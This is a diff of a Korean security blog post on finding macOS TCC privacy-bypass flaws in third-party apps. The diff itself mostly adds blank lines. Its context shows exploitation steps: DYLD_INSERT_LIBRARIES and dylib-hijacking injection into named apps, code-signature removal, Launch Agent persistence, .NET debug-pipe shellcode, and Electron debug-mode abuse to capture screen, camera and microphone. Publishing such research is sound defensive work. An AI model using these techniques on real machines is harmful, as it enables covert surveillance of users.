@@ -174,6 +174,7 @@ TCC 매커니즘을 우회해야 하는 공격자 입장에서는 취약한 애�
 손쉬운 사용 권한을 탈취하여 사용자의 현재 화면을 캡처한 후 `/tmp/screenshot.png`에 저장하는 코드이다.
 
 
+
 {% raw %}
 ```objective-c
 #include <Foundation/Foundation.h>
@@ -190,7 +191,9 @@ __attribute__((constructor)) static void pwn() {
 ```
 {% endraw %}
 
+
 1. 라이브러리 컴파일
+
 
 {% raw %}
 ```bash
@@ -198,13 +201,16 @@ gcc -dynamiclib -framework Foundation -framework AppKit poc.m -o poc
 ```
 {% endraw %}
 
+
 1. 악성 라이브러리 주입
+
 
 {% raw %}
 ```bash
 $ DYLD_INSERT_LIBRARIES=/tmp/poc.dylib /Applications/Magnet.app/Contents/MacOS/Magnet
 ```
 {% endraw %}
+
 
 1. 결과
 
@@ -263,6 +269,7 @@ Hardened Runtime을 사용하더라도 환경변수 주입을 허용하는 entit
 간단한 예시로 문자열 출력 후에 임의의 자식프로세스를 생성하는 DYLIB를 작성하였다.
 
 
+
 {% raw %}
 ```objective-c
 #include <Foundation/Foundation.h>
@@ -279,7 +286,9 @@ __attribute__((constructor)) static void pwn() {
 ```
 {% endraw %}
 
+
 1. 라이브러리 컴파일
+
 
 {% raw %}
 ```bash
@@ -287,13 +296,16 @@ $ gcc -dynamiclib -framework Foundation poc.m -o poc.dylib
 ```
 {% endraw %}
 
+
 1. 악성 라이브러리 주입
+
 
 {% raw %}
 ```bash
 $ DYLD_INSERT_LIBRARIES=/tmp/poc.dylib /Applications/logioptionsplus.app/Contents/MacOS/logioptionsplus
 ```
 {% endraw %}
+
 
 1. 결과
 
@@ -350,6 +362,7 @@ Launch Agent는 `~/Library/LaunchAgents`에 존재하는 파일들을 통해 관
 
 1. `~/Library/LauncheAgents`에 Launch Agent 작성
 
+
 {% raw %}
 ```xml
 <?xml version="1.0" encoding="UTF-8"?>
@@ -375,15 +388,18 @@ Launch Agent는 `~/Library/LaunchAgents`에 존재하는 파일들을 통해 관
 {% endraw %}
 
 
+
 ![8](/assets/img/2024-04-15-Methodology-for-discovering-TCC-Bypass-vulnerabilities-in-3rd-party-Applications.md/8.png)
 
 1. Launch Agent 등록 및 실행
+
 
 {% raw %}
 ```bash
 $ launchctl load com.poc.launcher.plist
 ```
 {% endraw %}
+
 
 1. 결과
 
@@ -488,6 +504,7 @@ Hardened Runtime이 적용되어 있으나 Library validation이 비활성화되
 여기서는 `otool` 명령어를 이용한 방법을 설명한다.
 
 
+
 {% raw %}
 ```bash
 $ otool -l 8x8\ Work
@@ -520,12 +537,14 @@ compatibility version 1.0.0
 {% endraw %}
 
 
+
 rpath가 `@executable_path/../Frameworks`로 정의되어 있으며 `Electron Framework.framework` 라이브러리를 rpath를 기반으로 찾는다.
 
 
 최종적으로 다음과 같은 경로의 라이브러리를 로드하게 된다.
 
 - `@executable_path/../Frameworks/Electron Framework.framework/Electron Framework`
+
 
 {% raw %}
 ```bash
@@ -561,6 +580,7 @@ $ tree
 {% endraw %}
 
 
+
 `@excutable_path`는 `MacOS/8x8 Work`이므로 `Frameworks/Electron Framework.framework`를 변조하면 된다는 것을 파악할 수 있다.
 
 
@@ -584,6 +604,7 @@ $ tree
 1. 악성 라이브러리 작성
 
 취약한 애플리케이션이 가지고 있는 카메라와 마이크 기능을 남용하기 위해 3초간 녹화하고 `/tmp/recording.mov`에 저장하는 코드를 작성하였다.
+
 
 
 {% raw %}
@@ -679,6 +700,7 @@ static void ex(int argc, const char **argv) {
 ```
 {% endraw %}
 
+
 1. 라이브러리 컴파일
 
 위에서 설명했듯이 애플리케이션이 기존 기호를 정상적으로 참조할 수 있도록 Re-Export를 진행해주어야 한다.
@@ -705,6 +727,7 @@ xcode에서 다음과 같은 컴파일 플래그를 추가해준다.
 원본 라이브러리는 로드되지 않도록 이름을 변경해준 후에 `install_name_tool`을 통해 악성 라이브러리가 원본 라이브러리를 참조하도록 변경한다.
 
 
+
 {% raw %}
 ```bash
 $ mv /Applications/8x8 Work.app/Contents/Frameworks/Electron Framework.framework/Versions/A/Electron\ Framework /Applications/8x8 Work.app/Contents/Frameworks/Electron Framework.framework/Versions/A/_Electron\ Framework
@@ -712,6 +735,7 @@ $ mv /Applications/8x8 Work.app/Contents/Frameworks/Electron Framework.framework
 $ install_name_tool -change "@rpath/poc.framework/Versions/A/poc" /Applications/8x8\ Work.app/Contents/Frameworks/Electron\ Framework.framework/Versions/A/_Electron\ Framework ./poc
 ```
 {% endraw %}
+
 
 
 ![15](/assets/img/2024-04-15-Methodology-for-discovering-TCC-Bypass-vulnerabilities-in-3rd-party-Applications.md/15.png)
@@ -723,6 +747,7 @@ $ install_name_tool -change "@rpath/poc.framework/Versions/A/poc" /Applications/
 이후에 애플리케이션이 악성 라이브러리를 로드하도록 원본 라이브러리가 위치했던 경로로 변경해준다.
 
 
+
 {% raw %}
 ```markdown
 $ mv /Users/lourcode/Library/Developer/Xcode/DerivedData/poc-eoopekezczbnvlgrpcigqhnhqgkn/Build/Products/Debug/poc.framework/Versions/A/poc /Applications/8x8\ Work.app/Contents/Frameworks/Electron\ Framework.framework/Versions/A/Electron\ Framework
@@ -730,7 +755,9 @@ $ mv /Users/lourcode/Library/Developer/Xcode/DerivedData/poc-eoopekezczbnvlgrpci
 {% endraw %}
 
 
+
 최종적으로 디렉토리 구조는 다음과 같이 되어야 한다.
+
 
 
 {% raw %}
@@ -755,6 +782,7 @@ $ tree
 ```
 {% endraw %}
 
+
 1. 추가 작업
 
 악성 라이브러리에 대한 Libary Validation 관련 작업을 수행하지 않았으므로 현재 상태에서 애플리케이션을 실행하게 되면 라이브러리 로드가 실패하게 된다.
@@ -769,12 +797,14 @@ $ tree
 만약 Library Validation이 활성화 되어 있었을 경우에는 코드 서명을 제거한 라이브러리는 로드되지 않았을 것이다.
 
 
+
 {% raw %}
 ```bash
 $ codesign --remove-signature ./Electron\ Framework
 $ codesign --remove-signature ./_Electron\ Framework
 ```
 {% endraw %}
+
 
 1. 결과
 
@@ -826,6 +856,7 @@ Gatekeeper란 사용자가 신뢰하는 소프트웨어만이 실행될 수 있�
 아래는 `.terminal` 파일의 예시이다.
 
 
+
 {% raw %}
 ```xml
 <?xml version="1.0" encoding="UTF-8"?>
@@ -846,6 +877,7 @@ Gatekeeper란 사용자가 신뢰하는 소프트웨어만이 실행될 수 있�
 </plist>
 ```
 {% endraw %}
+
 
 
 <br>
@@ -950,6 +982,7 @@ Apple의 `xattr` 툴을 통해 `Quarantine`의 여부를 확인할 수 있다.
 .NET Core는 `DbgTransportSession::Init` 메서드를 통해 디버그 세션을 생성하고 `TwoWayPipe::CreateServer` 메서드를 호출하여 두개의 디버그 파이프를 생성한다.
 
 
+
 {% raw %}
 ```c++
 // https://github.com/dotnet/runtime/blob/35562ee5ac02c68d42d5b77fb0af09123d79c3ba/src/coreclr/debug/debug-pal/unix/twowaypipe.cpp#L16
@@ -983,6 +1016,7 @@ bool TwoWayPipe::CreateServer(const ProcessDescriptor& pd)
 }
 ```
 {% endraw %}
+
 
 
 <br>
@@ -1046,11 +1080,13 @@ $TMPDIR은 환경 변수에서 확인할 수 있다.
 다음과 같이 디버그 파이프에 연결하여 위에 출력된 메모리에 임의의 값을 작성한다.
 
 
+
 {% raw %}
 ```bash
 export in=$(ls /var/folders/n1/nc8h8x5n0_3387ttlfk_54j80000gn/T/*-in); export out=$(ls /var/folders/n1/nc8h8x5n0_3387ttlfk_54j80000gn/T/*-out); ./memdump $in $out 105553119630272
 ```
 {% endraw %}
+
 
 
 <br>
@@ -1094,20 +1130,24 @@ export in=$(ls /var/folders/n1/nc8h8x5n0_3387ttlfk_54j80000gn/T/*-in); export ou
 	쉘코드를 다음과 같이 변경해주었다.
 
 
-	{% raw %}
+	
+{% raw %}
 ```c++
 	unsigned char shellcode[] = "\x48\x31\xc0\x99\x50\x48\xbf\x2f\x74\x6d\x70\x2f\x70\x6f\x63\x57\x54\x5f\x48\x31\xf6\xb0\x02\x48\xc1\xc8\x28\xb0\x3b\x0f\x05";
 	```
 {% endraw %}
 
+
 1. Powershell 실행
 2. Exploit 코드 실행
+
 
 {% raw %}
 ```bash
 export in=$(ls /var/folders/n1/nc8h8x5n0_3387ttlfk_54j80000gn/T/*-in); export out=$(ls /var/folders/n1/nc8h8x5n0_3387ttlfk_54j80000gn/T/*-out); ./poc $in $out pwsh
 ```
 {% endraw %}
+
 
 
 ![30](/assets/img/2024-04-15-Methodology-for-discovering-TCC-Bypass-vulnerabilities-in-3rd-party-Applications.md/30.png)
@@ -1175,6 +1215,7 @@ JIT를 제외하면 런타임 내의 프로세스 주입의 모든 방법이 불
 
 1. 디버그 모드로 실행
 
+
 {% raw %}
 ```bash
 $ ./Discord --inspect=9229
@@ -1186,6 +1227,7 @@ Starting app.
 ```
 {% endraw %}
 
+
 1. `chrome://inspect` 접속
 
 	![33](/assets/img/2024-04-15-Methodology-for-discovering-TCC-Bypass-vulnerabilities-in-3rd-party-Applications.md/33.png)
@@ -1196,6 +1238,7 @@ Starting app.
 2. 악성 프로그램 작성
 
 위에서 작성한 카메라 권한 남용 코드와 동일하지만 DYLIB가 아니므로 생성자 대신 main 함수를 작성한다.
+
 
 
 {% raw %}
@@ -1214,13 +1257,16 @@ void main(int argc, const char **argv) {
 ```
 {% endraw %}
 
+
 1. 악성 프로그램 컴파일
+
 
 {% raw %}
 ```bash
 $ gcc -framework Foundation -framework AVFoundation poc.m -o poc
 ```
 {% endraw %}
+
 
 1. 임의의 NodeJS 명령 실행
 
@@ -1264,6 +1310,7 @@ Visual Studio Code 또한 JIT를 제외하면 런타임 내의 프로세스 주�
 
 1. NodeJS 모드로 실행
 
+
 {% raw %}
 ```bash
 $ ELECTRON_RUN_AS_NODE=1 /Applications/Visual\ Studio\ Code.app/Contents/MacOS/Electron
@@ -1271,6 +1318,7 @@ Welcome to Node.js v18.17.1.
 Type ".help" for more information.
 ```
 {% endraw %}
+
 
 1. Launch Agent 등록
 
@@ -1281,6 +1329,7 @@ Type ".help" for more information.
 
 
 Launch Agent는 다음과 같다.
+
 
 
 {% raw %}
@@ -1310,7 +1359,9 @@ Launch Agent는 다음과 같다.
 {% endraw %}
 
 
+
 다음 명령어를 통해 Launch Agent를 실행해준다.
+
 
 
 {% raw %}
@@ -1318,6 +1369,7 @@ Launch Agent는 다음과 같다.
 launchctl load com.poc.launcher.plist
 ```
 {% endraw %}
+
 
 1. 임의의 NodeJS 명령 실행
 
